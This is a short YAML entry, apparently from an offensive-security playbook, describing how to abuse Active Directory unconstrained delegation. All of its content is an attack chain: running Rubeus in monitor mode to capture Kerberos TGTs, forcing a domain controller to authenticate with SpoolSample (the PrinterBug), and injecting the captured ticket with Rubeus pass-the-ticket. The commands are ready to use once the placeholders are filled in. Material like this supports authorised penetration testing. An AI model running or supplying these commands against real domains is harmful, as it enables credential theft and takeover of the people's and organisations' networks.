name: UnconstrainedDelegation
description: Capture TGTs from users authenticating to this machine
commands:
- '# Monitor for incoming TGTs with Rubeus'
- Rubeus.exe monitor /interval:5 /nowrap
- ''
- '# Coerce authentication (e.g., PrinterBug)'
- SpoolSample.exe <TARGET_DC> <UNCONSTRAINED_HOST>
- ''
- '# Use captured TGT'
- Rubeus.exe ptt /ticket:<BASE64_TICKET>
opsec: []
references: []
